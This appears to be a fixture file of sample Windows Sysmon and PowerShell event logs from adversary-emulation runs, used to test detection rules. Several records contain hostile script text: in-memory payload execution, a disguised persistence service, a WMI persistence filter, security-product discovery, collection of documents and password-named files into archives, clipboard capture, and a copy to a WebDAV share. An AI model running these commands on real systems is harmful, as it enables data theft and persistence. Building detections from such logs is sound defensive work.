\\\"\\\\\\\\\\\\\\\\.\\\\\\\\ROOT\\\\\\\\subscription:__EventFilter.Name=\\\\\\\"AtomicRedTeam-WMIPersistence-Example\\\\\\\"\\\"\\\"\",\"version\":\"3\",\"systemTime\":\"2021-03-01T20:53:46.5721127Z\",\"eventRecordID\":\"33060\",\"threadID\":\"6368\",\"computer\":\"DESKTOP-2QKFOBA\",\"task\":\"21\",\"processID\":\"2368\",\"severityValue\":\"INFORMATION\",\"providerName\":\"Microsoft-Windows-Sysmon\"}}}"}
{"source": "sysmon.ini:129", "name": "Sysmon EventID 22", "log": "{\"win\":{\"eventdata\":{\"image\":\"C:\\\\\\\\Program Files (x86)\\\\\\\\Microsoft\\\\\\\\Edge\\\\\\\\Application\\\\\\\\msedge.exe\",\"processGuid\":\"{4dc16835-e4b7-612f-d002-000000001900}\",\"queryStatus\":\"0\",\"processId\":\"2412\",\"utcTime\":\"2021-09-01 20:40:24.039\",\"queryName\":\"img-s-msn-com.akamaized.net\",\"queryResults\":\"type:  5 a1834.dspg2.akamai.net;181.30.131.40;181.30.131.42;\"},\"system\":{\"eventID\":\"22\",\"keywords\":\"0x8000000000000000\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"level\":\"4\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"opcode\":\"0\",\"message\":\"\\\"Dns query:\\r\\nRuleName: -\\r\\nUtcTime: 2021-09-01 20:40:24.039\\r\\nProcessGuid: {4dc16835-e4b7-612f-d002-000000001900}\\r\\nProcessId: 2412\\r\\nQueryName: img-s-msn-com.akamaized.net\\r\\nQueryStatus: 0\\r\\nQueryResults: type:  5 a1834.dspg2.akamai.net;181.30.131.40;181.30.131.42;\\r\\nImage: C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe\\\"\",\"version\":\"5\",\"systemTime\":\"2021-09-01T20:40:34.8860064Z\",\"eventRecordID\":\"182667\",\"threadID\":\"1592\",\"computer\":\"cfo.ExchangeTest.com\",\"task\":\"22\",\"processID\":\"2400\",\"severityValue\":\"INFORMATION\",\"providerName\":\"Microsoft-Windows-Sysmon\"}}}"}
{"source": "sysmon.ini:135", "name": "Sysmon EventID 23", "log": "{\"win\":{\"eventdata\":{\"image\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\poqexec.exe\",\"archived\":\"true\",\"processGuid\":\"{4dc16835-e584-612f-baba-cc0000000000}\",\"processId\":\"1960\",\"utcTime\":\"2021-09-01 20:41:48.604\",\"targetFilename\":\"C:\\\\\\\\Windows\\\\\\\\SysWOW64\\\\\\\\WsmRes.dll\",\"hashes\":\"SHA1=7B494AB968B305F969F7F86630FBB06CFDED6C76,MD5=0A09CEDE529A4A71A37D4BB8F40EF55C,SHA256=99B69B8C2D5020F2F8BFF7951CD79F01CD97294F84053D5EB42B3A7C66CBA347,IMPHASH=00000000000000000000000000000000\",\"isExecutable\":\"true\",\"user\":\"NT AUTHORITY\\\\\\\\SYSTEM\"},\"system\":{\"eventID\":\"23\",\"keywords\":\"0x8000000000000000\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"level\":\"4\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"opcode\":\"0\",\"message\":\"\\\"File Delete archived:\\r\\nRuleName: -\\r\\nUtcTime: 2021-09-01 20:41:48.604\\r\\nProcessGuid: {4dc16835-e584-612f-baba-cc0000000000}\\r\\nProcessId: 1960\\r\\nUser: NT AUTHORITY\\\\SYSTEM\\r\\nImage: C:\\\\Windows\\\\System32\\\\poqexec.exe\\r\\nTargetFilename: C:\\\\Windows\\\\SysWOW64\\\\WsmRes.dll\\r\\nHashes: SHA1=7B494AB968B305F969F7F86630FBB06CFDED6C76,MD5=0A09CEDE529A4A71A37D4BB8F40EF55C,SHA256=99B69B8C2D5020F2F8BFF7951CD79F01CD97294F84053D5EB42B3A7C66CBA347,IMPHASH=00000000000000000000000000000000\\r\\nIsExecutable: true\\r\\nArchived: true\\\"\",\"version\":\"5\",\"systemTime\":\"2021-09-01T20:41:48.6048977Z\",\"eventRecordID\":\"183596\",\"threadID\":\"3140\",\"computer\":\"cfo.ExchangeTest.com\",\"task\":\"23\",\"processID\":\"2400\",\"severityValue\":\"INFORMATION\",\"providerName\":\"Microsoft-Windows-Sysmon\"}}}"}
{"source": "sysmon.ini:141", "name": "Sysmon EventID 25", "log": "{\"win\":{\"eventdata\":{\"image\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\wbem\\\\\\\\WMIADAP.exe\",\"processGuid\":\"{4dc16835-ddfd-6116-5a0b-1d0000000000}\",\"processId\":\"352\",\"utcTime\":\"2021-08-13 21:02:53.207\",\"type\":\"Image is locked for access\"},\"system\":{\"eventID\":\"25\",\"keywords\":\"0x8000000000000000\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"level\":\"4\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"opcode\":\"0\",\"message\":\"\\\"Process Tampering:\\r\\nRuleName: -\\r\\nUtcTime: 2021-08-13 21:02:53.207\\r\\nProcessGuid: {4dc16835-ddfd-6116-5a0b-1d0000000000}\\r\\nProcessId: 352\\r\\nImage: C:\\\\Windows\\\\System32\\\\wbem\\\\WMIADAP.exe\\r\\nType: Image is locked for access\\\"\",\"version\":\"5\",\"systemTime\":\"2021-08-13T21:02:53.2085459Z\",\"eventRecordID\":\"343354\",\"threadID\":\"4260\",\"computer\":\"hrmanager.ExchangeTest.com\",\"task\":\"25\",\"processID\":\"2668\",\"severityValue\":\"INFORMATION\",\"providerName\":\"Microsoft-Windows-Sysmon\"}}}"}
{"source": "sysmon.ini:147", "name": "Sysmon EventID 255", "log": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"255\",\"version\":\"5\",\"level\":\"4\",\"task\":\"22\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2022-10-14T10:19:22.7373425Z\",\"eventRecordID\":\"271\",\"processID\":\"2624\",\"threadID\":\"3544\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"EC2AMAZ-N9OLJ1L\",\"severityValue\":\"INFORMATION\",\"message\":\"\\\"Dns query:\\r\\nRuleName: -\\r\\nUtcTime: 2022-10-14 10:19:19.391\\r\\nProcessGuid: {3bd4f97a-3636-6349-6500-000000009800}\\r\\nProcessId: 2820\\r\\nQueryName: ssm.us-east-1.amazonaws.com\\r\\nQueryStatus: 0\\r\\nQueryResults: ::ffff:52.119.198.91;\\r\\nImage: C:\\\\Program Files\\\\Amazon\\\\SSM\\\\ssm-agent-worker.exe\\r\\nUser: NT AUTHORITY\\\\SYSTEM\\\"\"},\"eventdata\":{\"utcTime\":\"2022-10-14 10:19:19.391\",\"processGuid\":\"{3bd4f97a-3636-6349-6500-000000009800}\",\"processId\":\"2820\",\"queryName\":\"ssm.us-east-1.amazonaws.com\",\"queryStatus\":\"0\",\"queryResults\":\"::ffff:52.119.198.91;\",\"image\":\"C:\\\\\\\\Program Files\\\\\\\\Amazon\\\\\\\\SSM\\\\\\\\ssm-agent-worker.exe\",\"user\":\"NT AUTHORITY\\\\\\\\SYSTEM\"}}}"}
{"source": "powershell.ini:2", "name": "Get-ItemProperty query", "log": "{\"win\":{\"eventdata\":{\"path\":\"C:\\\\\\\\Users\\\\\\\\AtomicRed\\\\\\\\AppData\\\\\\\\Roaming\\\\\\\\TransbaseOdbcDriver\\\\\\\\LanCradDriver.ps1\",\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"Get-ItemProperty -Path C:\\\\\",\"scriptBlockId\":\"95af64d2-0002-4dd7-a150-d3dad1009afa\"},\"system\":{\"eventID\":\"4104\",\"keywords\":\"0x0\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"level\":\"3\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"opcode\":\"15\",\"message\":\"Get-ItemProperty -Path C:\\\\\",\"version\":\"1\",\"systemTime\":\"2021-08-13T22:21:37.5045856Z\",\"eventRecordID\":\"96584\",\"threadID\":\"7128\",\"computer\":\"hrmanager.ExchangeTest.com\",\"task\":\"2\",\"processID\":\"904\",\"severityValue\":\"WARNING\",\"providerName\":\"Microsoft-Windows-PowerShell\"}}}"}
{"source": "powershell.ini:8", "name": "Get-ItemProperty query registry", "log": "{\"win\":{\"eventdata\":{\"path\":\"C:\\\\\\\\Users\\\\\\\\AtomicRed\\\\\\\\AppData\\\\\\\\Roaming\\\\\\\\TransbaseOdbcDriver\\\\\\\\LanCradDriver.ps1\",\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$Payload = (Get-ItemProperty -Path HKCU:\\\\\\\\Software\\\\\\\\InternetExplorer\\\\\\\\AppDataLow\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\InternetExplorer).'{018247B2CAC14652E}'\",\"scriptBlockId\":\"95af64d2-0002-4dd7-a150-d3dad1009afa\"},\"system\":{\"eventID\":\"4104\",\"keywords\":\"0x0\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"level\":\"3\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"opcode\":\"15\",\"message\":\"$Payload = (Get-ItemProperty -Path HKCU:\\\\\\\\Software\\\\\\\\InternetExplorer\\\\\\\\AppDataLow\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\InternetExplorer).'{018247B2CAC14652E}'\",\"version\":\"1\",\"systemTime\":\"2021-08-13T22:21:37.5045856Z\",\"eventRecordID\":\"96584\",\"threadID\":\"7128\",\"computer\":\"hrmanager.ExchangeTest.com\",\"task\":\"2\",\"processID\":\"904\",\"severityValue\":\"WARNING\",\"providerName\":\"Microsoft-Windows-PowerShell\"}}}"}
{"source": "powershell.ini:14", "name": "Base64 decode from scriptblock", "log": "{\"win\":{\"eventdata\":{\"path\":\"C:\\\\\\\\Users\\\\\\\\AtomicRed\\\\\\\\AppData\\\\\\\\Roaming\\\\\\\\TransbaseOdbcDriver\\\\\\\\LanCradDriver.ps1\",\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$bytes = [System.Convert]::FromBase64String($Payload)\",\"scriptBlockId\":\"95af64d2-0002-4dd7-a150-d3dad1009afa\"},\"system\":{\"eventID\":\"4104\",\"keywords\":\"0x0\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"level\":\"3\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"opcode\":\"15\",\"message\":\"$bytes = [System.Convert]::FromBase64String($Payload)\",\"version\":\"1\",\"systemTime\":\"2021-08-13T22:21:37.5045856Z\",\"eventRecordID\":\"96584\",\"threadID\":\"7128\",\"computer\":\"hrmanager.ExchangeTest.com\",\"task\":\"2\",\"processID\":\"904\",\"severityValue\":\"WARNING\",\"providerName\":\"Microsoft-Windows-PowerShell\"}}}"}
{"source": "powershell.ini:20", "name": "CreateThread API execution", "log": "{\"win\":{\"eventdata\":{\"path\":\"C:\\\\\\\\Users\\\\\\\\AtomicRed\\\\\\\\AppData\\\\\\\\Roaming\\\\\\\\TransbaseOdbcDriver\\\\\\\\LanCradDriver.ps1\",\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$WinObj::CreateThread(0,0,$WinMem,0,0,0)\",\"scriptBlockId\":\"95af64d2-0002-4dd7-a150-d3dad1009afa\"},\"system\":{\"eventID\":\"4104\",\"keywords\":\"0x0\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"level\":\"3\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"opcode\":\"15\",\"message\":\"$WinObj::CreateThread(0,0,$WinMem,0,0,0)\",\"version\":\"1\",\"systemTime\":\"2021-08-13T22:21:37.5045856Z\",\"eventRecordID\":\"96584\",\"threadID\":\"7128\",\"computer\":\"hrmanager.ExchangeTest.com\",\"task\":\"2\",\"processID\":\"904\",\"severityValue\":\"WARNING\",\"providerName\":\"Microsoft-Windows-PowerShell\"}}}"}
{"source": "powershell.ini:26", "name": "Powershell script executed \"Expand-Archive\": $(win.eventdata.scriptBlockText)", "log": "{ \"win\": { \"eventdata\": { \"messageNumber\": \"1\", \"messageTotal\": \"1\", \"scriptBlockText\": \"Expand-Archive -LiteralPath \\\\\\\"$env:USERPROFILE\\\\\\\\Downloads\\\\\\\\SysinternalsSuite.zip\\\\\\\" -DestinationPath \\\\\\\"$env:USERPROFILE\\\\\\\\Downloads\\\\\\\\SysinternalsSuite\\\\\\\\\\\\\\\"\", \"scriptBlockId\": \"6f67fff0-7f00-4b9e-8de7-a7749cf7c4f5\" }, \"system\": { \"eventID\": \"4104\", \"keywords\": \"0x0\", \"providerGuid\": \"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\", \"level\": \"5\", \"channel\": \"Microsoft-Windows-PowerShell/Operational\", \"opcode\": \"15\", \"message\": \"\\\"Creating Scriptblock text (1 of 1):\\r\\nExpand-Archive -LiteralPath \\\"$env:USERPROFILE\\\\Downloads\\\\SysinternalsSuite.zip\\\" -DestinationPath \\\"$env:USERPROFILE\\\\Downloads\\\\SysinternalsSuite\\\\\\\"\\r\\n\\r\\nScriptBlock ID: 6f67fff0-7f00-4b9e-8de7-a7749cf7c4f5\\r\\nPath: \\\"\", \"version\": \"1\", \"systemTime\": \"2021-10-20T19:20:23.7594447Z\", \"eventRecordID\": \"1216582\", \"threadID\": \"440\", \"computer\": \"Workstation1.dc.local\", \"task\": \"2\", \"processID\": \"4308\", \"severityValue\": \"VERBOSE\", \"providerName\": \"Microsoft-Windows-PowerShell\" } } }"}
{"source": "powershell.ini:32", "name": "Powershell script deleted a registry key from an object", "log": "{ \"win\": { \"eventdata\": { \"messageNumber\": \"1\", \"messageTotal\": \"1\", \"scriptBlockText\": \"Remove-Item -Path HKCU:\\\\\\\\Software\\\\\\\\Classes\\\\\\\\Folder* -Recurse -Force\", \"scriptBlockId\": \"ea6dc896-b908-4ca4-8185-26306d02b344\" }, \"system\": { \"eventID\": \"4104\", \"keywords\": \"0x0\", \"providerGuid\": \"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\", \"level\": \"5\", \"channel\": \"Microsoft-Windows-PowerShell/Operational\", \"opcode\": \"15\", \"message\": \"\\\"Creating Scriptblock text (1 of 1):\\r\\nRemove-Item -Path HKCU:\\\\Software\\\\Classes\\\\Folder* -Recurse -Force\\r\\n\\r\\nScriptBlock ID: ea6dc896-b908-4ca4-8185-26306d02b344\\r\\nPath: \\\"\", \"version\": \"1\", \"systemTime\": \"2021-10-22T13:24:41.9523235Z\", \"eventRecordID\": \"1454348\", \"threadID\": \"4652\", \"computer\": \"apt29w1.xrisbarney.local\", \"task\": \"2\", \"processID\": \"4080\", \"severityValue\": \"VERBOSE\", \"providerName\": \"Microsoft-Windows-PowerShell\" } } }"}
{"source": "powershell.ini:38", "name": "Powershell executing process discovery", "log": "{ \"win\": { \"eventdata\": { \"messageNumber\": \"1\", \"messageTotal\": \"1\", \"scriptBlockText\": \"Get-Process\", \"scriptBlockId\": \"9c6b55b4-e9c5-4f65-84be-7fbf124f22ba\" }, \"system\": { \"eventID\": \"4104\", \"keywords\": \"0x0\", \"providerGuid\": \"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\", \"level\": \"5\", \"channel\": \"Microsoft-Windows-PowerShell/Operational\", \"opcode\": \"15\", \"message\": \"\\\"Creating Scriptblock text (1 of 1):\\r\\nGet-Process\\r\\n\\r\\nScriptBlock ID: 9c6b55b4-e9c5-4f65-84be-7fbf124f22ba\\r\\nPath: \\\"\", \"version\": \"1\", \"systemTime\": \"2021-10-22T07:06:02.4654994Z\", \"eventRecordID\": \"1219837\", \"threadID\": \"6156\", \"computer\": \"Workstation1.dc.local\", \"task\": \"2\", \"processID\": \"5612\", \"severityValue\": \"VERBOSE\", \"providerName\": \"Microsoft-Windows-PowerShell\" } } }"}
{"source": "powershell.ini:44", "name": "Powershell script querying system environment variables", "log": "{\"win\":{\"eventdata\":{\"path\":\"C:\\\\\\\\Program Files\\\\\\\\SysinternalsSuite\\\\\\\\readme.ps1\",\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"function Invoke-Discovery {      $DiscoveryInfo =@()      $CurrentDir = Get-Location        $DiscoveryInfo += [PSCustomObject]@{                  CurrentDirectory = $CurrentDir                  TempDirectory = $env:TEMP                  UserName = $env:USERNAME                  ComputerName = $env:COMPUTERNAME                  UserDomain = $env:USERDOMAIN                  CurrentPID = $PID              }        $DiscoveryInfo | Format-List            $NameSpace = Get-WmiObject -Namespace \\\\\\\"root\\\\\\\" -Class \\\\\\\"__Namespace\\\\\\\" | Select Name | Out-String -Stream | Select-String \\\\\\\"SecurityCenter\\\\\\\"      foreach ($SecurityCenter in $NameSpace) {           Get-WmiObject -Namespace \\\\\\\"root\\\\\\\\$SecurityCenter\\\\\\\"  -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List          WmiObject -Namespace \\\\\\\"root\\\\\\\\$SecurityCenter\\\\\\\" -Class FireWallProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List       }         Gwmi Win32_OperatingSystem | Select Name, OSArchitecture, CSName, BuildNumber, Version | Format-List      Invoke-NetUserGetGroups      Invoke-NetUserGetLocalGroups  }\",\"scriptBlockId\":\"0cff31fd-3944-44fd-b87a-14207b838c3b\"},\"system\":{\"eventID\":\"4104\",\"keywords\":\"0x0\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"level\":\"5\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"opcode\":\"15\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\nfunction Invoke-Discovery {\\r\\n    $DiscoveryInfo =@()\\r\\n    $CurrentDir = Get-Location\\r\\n\\r\\n    $DiscoveryInfo += [PSCustomObject]@{\\r\\n                CurrentDirectory = $CurrentDir\\r\\n                TempDirectory = $env:TEMP\\r\\n                UserName = $env:USERNAME\\r\\n                ComputerName = $env:COMPUTERNAME\\r\\n                UserDomain = $env:USERDOMAIN\\r\\n                CurrentPID = $PID\\r\\n            }\\r\\n\\r\\n    $DiscoveryInfo | Format-List\\r\\n    \\r\\n    $NameSpace = Get-WmiObject -Namespace \\\"root\\\" -Class \\\"__Namespace\\\" | Select Name | Out-String -Stream | Select-String \\\"SecurityCenter\\\"\\r\\n    foreach ($SecurityCenter in $NameSpace) { \\r\\n        Get-WmiObject -Namespace \\\"root\\\\$SecurityCenter\\\"  -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List\\r\\n        WmiObject -Namespace \\\"root\\\\$SecurityCenter\\\" -Class FireWallProduct -ErrorAction SilentlyContinue | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List \\r\\n    } \\r\\n\\r\\n    Gwmi Win32_OperatingSystem | Select Name, OSArchitecture, CSName, BuildNumber, Version | Format-List\\r\\n    Invoke-NetUserGetGroups\\r\\n    Invoke-NetUserGetLocalGroups\\r\\n}\\r\\n\\r\\nScriptBlock ID: 0cff31fd-3944-44fd-b87a-14207b838c3b\\r\\nPath: C:\\\\Program Files\\\\SysinternalsSuite\\\\readme.ps1\\\"\",\"version\":\"1\",\"systemTime\":\"2021-10-25T09:20:32.5187021Z\",\"eventRecordID\":\"1411669\",\"threadID\":\"3816\",\"computer\":\"Workstation1.dc.local\",\"task\":\"2\",\"processID\":\"6660\",\"severityValue\":\"VERBOSE\",\"providerName\":\"Microsoft-Windows-PowerShell\"}}}"}
{"source": "powershell.ini:50", "name": "Powershell script executed New-Service command", "log": "{\"win\":{\"eventdata\":{\"path\":\"C:\\\\\\\\Program Files\\\\\\\\SysinternalsSuite\\\\\\\\readme.ps1\",\"messageNumber\":\"3\",\"messageTotal\":\"4\",\"scriptBlockText\":\"            # create new service             New-Service -Name \\\\\\\"javamtsup\\\\\\\" -BinaryPathName \\\\\\\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\javamtsup.exe\\\\\\\" -DisplayName \\\\\\\"Java(TM) Virtual Machine Support Service\\\\\\\" -StartupType Automatic          } \",\"scriptBlockId\":\"040c2fc8-4a6c-45b1-ad8d-edb86ddef55c\"},\"system\":{\"eventID\":\"4104\",\"keywords\":\"0x0\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"level\":\"3\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"opcode\":\"15\",\"message\":\"\\\"Creating Scriptblock text (3 of 4):  New-Service -Name \\\"javamtsup\\\" -BinaryPathName \\\"C:\\\\Windows\\\\System32\\\\javamtsup.exe\\\" -DisplayName \\\"Java(TM) Virtual Machine Support Service\\\" -StartupType Automatic\\n\\n        }\\n  \",\"version\":\"1\",\"systemTime\":\"2021-10-25T20:41:42.7660456Z\",\"eventRecordID\":\"96690\",\"threadID\":\"5564\",\"computer\":\"hrmanager.ExchangeTest.com\",\"task\":\"2\",\"processID\":\"6964\",\"severityValue\":\"WARNING\",\"providerName\":\"Microsoft-Windows-PowerShell\"}}}"}
{"source": "powershell.ini:56", "name": "Powershell script created a compressed file", "log": "{ \"win\": { \"eventdata\": { \"messageNumber\": \"1\", \"messageTotal\": \"1\", \"scriptBlockText\": \"$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\\\\\\\\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\\\\\\\\working.zip -Force\", \"scriptBlockId\": \"d63208a1-c4c7-4d1b-ac00-378952568ae7\" }, \"system\": { \"eventID\": \"4104\", \"keywords\": \"0x0\", \"providerGuid\": \"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\", \"level\": \"5\", \"channel\": \"Microsoft-Windows-PowerShell/Operational\", \"opcode\": \"15\", \"message\": \"\\\"Creating Scriptblock text (1 of 1):\\r\\n$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\\\\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\\\\working.zip -Force\\r\\n\\r\\nScriptBlock ID: d63208a1-c4c7-4d1b-ac00-378952568ae7\\r\\nPath: \\\"\", \"version\": \"1\", \"systemTime\": \"2021-10-27T10:47:51.2128285Z\", \"eventRecordID\": \"1558\", \"threadID\": \"3724\", \"computer\": \"apt29w2.xrisbarney.local\", \"task\": \"2\", \"processID\": \"3976\", \"severityValue\": \"VERBOSE\", \"providerName\": \"Microsoft-Windows-PowerShell\" } } }"}
{"source": "powershell.ini:62", "name": "Powershell script executed \"Invoke-command\" cmdlet in remote computer", "log": "{\"win\":{\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"Invoke-Command -ComputerName 192.168.0.95 -ScriptBlock {Select-Object UserName,SessionId | Where-Object { $_.UserName -like \\\\\\\"*\\\\\\\\$env:USERNAME\\\\\\\" } | Sort-Object SessionId -Unique } | Select-Object UserName,SessionId\",\"scriptBlockId\":\"fffc8511-1b1f-4eb5-9d72-39968178b82f\"},\"system\":{\"eventID\":\"4104\",\"keywords\":\"0x0\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"level\":\"5\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"opcode\":\"15\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\nInvoke-Command -ComputerName 192.168.0.95 -ScriptBlock {  Select-Object UserName,SessionId | Where-Object { $_.UserName -like \\\"*\\\\$env:USERNAME\\\" } | Sort-Object SessionId -Unique } | Select-Object UserName,SessionId\\r\\n\\r\\nScriptBlock ID: fffc8511-1b1f-4eb5-9d72-39968178b82f\\r\\nPath: \\\"\",\"version\":\"1\",\"systemTime\":\"2021-10-26T20:50:44.3584849Z\",\"eventRecordID\":\"96943\",\"threadID\":\"5204\",\"computer\":\"hrmanager.ExchangeTest.com\",\"task\":\"2\",\"processID\":\"1284\",\"severityValue\":\"VERBOSE\",\"providerName\":\"Microsoft-Windows-PowerShell\"}}}"}
{"source": "powershell.ini:68", "name": "Powershell collected clipboard data", "log": "{ \"win\": { \"eventdata\": { \"messageNumber\": \"1\", \"messageTotal\": \"1\", \"scriptBlockText\": \"Get-Clipboard\", \"scriptBlockId\": \"22352942-76d4-4e20-868d-0c647cff2a31\" }, \"system\": { \"eventID\": \"4104\", \"keywords\": \"0x0\", \"providerGuid\": \"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\", \"level\": \"5\", \"channel\": \"Microsoft-Windows-PowerShell/Operational\", \"opcode\": \"15\", \"message\": \"\\\"Creating Scriptblock text (1 of 1):\\r\\nGet-Clipboard\\r\\n\\r\\nScriptBlock ID: 22352942-76d4-4e20-868d-0c647cff2a31\\r\\nPath: \\\"\", \"version\": \"1\", \"systemTime\": \"2021-10-25T22:12:09.1205336Z\", \"eventRecordID\": \"1854459\", \"threadID\": \"4860\", \"computer\": \"Workstation1.dc.local\", \"task\": \"2\", \"processID\": \"5824\", \"severityValue\": \"VERBOSE\", \"providerName\": \"Microsoft-Windows-PowerShell\" } } }"}
{"source": "powershell.ini:74", "name": "Powershell executed file compression", "log": "{ \"win\": { \"eventdata\": { \"messageNumber\": \"1\", \"messageTotal\": \"1\", \"scriptBlockText\": \"Compress-7Zip -Path \\\\\\\"$env:USERPROFILE\\\\\\\\Downloads\\\\\\\\\\\\\\\" -Filter * -Password \\\\\\\"lolol\\\\\\\" -ArchiveFileName \\\\\\\"$env:APPDATA\\\\\\\\OfficeSupplies.7z\\\\\\\"\", \"scriptBlockId\": \"1f45fda9-d824-42e3-a2b8-9c0117384406\" }, \"system\": { \"eventID\": \"4104\", \"keywords\": \"0x0\", \"providerGuid\": \"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\", \"level\": \"5\", \"channel\": \"Microsoft-Windows-PowerShell/Operational\", \"opcode\": \"15\", \"message\": \"\\\"Creating Scriptblock text (1 of 1):\\r\\nCompress-7Zip -Path \\\"$env:USERPROFILE\\\\Downloads\\\\\\\" -Filter * -Password \\\"lolol\\\" -ArchiveFileName \\\"$env:APPDATA\\\\OfficeSupplies.7z\\\"\\r\\n\\r\\nScriptBlock ID: 1f45fda9-d824-42e3-a2b8-9c0117384406\\r\\nPath: \\\"\", \"version\": \"1\", \"systemTime\": \"2021-10-26T13:37:04.2701868Z\", \"eventRecordID\": \"1877996\", \"threadID\": \"3096\", \"computer\": \"Workstation1.dc.local\", \"task\": \"2\", \"processID\": \"2336\", \"severityValue\": \"VERBOSE\", \"providerName\": \"Microsoft-Windows-PowerShell\" } } }"}
{"source": "powershell.ini:80", "name": "Powershell executed \"Copy-Item\"", "log": "{ \"win\": { \"eventdata\": { \"messageNumber\": \"1\", \"messageTotal\": \"1\", \"scriptBlockText\": \"    Copy-Item \\\\\\\"$env:APPDATA\\\\\\\\OfficeSupplies.7z\\\\\\\" \\\\\\\"WebDavShare:\\\\\\\\OfficeSupplies.7z\\\\\\\" -Force\", \"scriptBlockId\": \"7f0b516e-2f1d-4df4-aad6-575437aabf34\" }, \"system\": { \"eventID\": \"4104\", \"keywords\": \"0x0\", \"providerGuid\": \"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\", \"level\": \"5\", \"channel\": \"Microsoft-Windows-PowerShell/Operational\", \"opcode\": \"15\", \"message\": \"\\\"Creating Scriptblock text (1 of 1):\\r\\n    Copy-Item \\\"$env:APPDATA\\\\OfficeSupplies.7z\\\" \\\"WebDavShare:\\\\OfficeSupplies.7z\\\" -Force\\r\\n\\r\\nScriptBlock ID: 7f0b516e-2f1d-4df4-aad6-575437aabf34\\r\\nPath: \\\"\", \"version\": \"1\", \"systemTime\": \"2021-10-26T13:45:08.3556178Z\", \"eventRecordID\": \"1878619\", \"threadID\": \"3096\", \"computer\": \"Workstation1.dc.local\", \"task\": \"2\", \"processID\": \"2336\", \"severityValue\": \"VERBOSE\", \"providerName\": \"Microsoft-Windows-PowerShell\" } } }"}
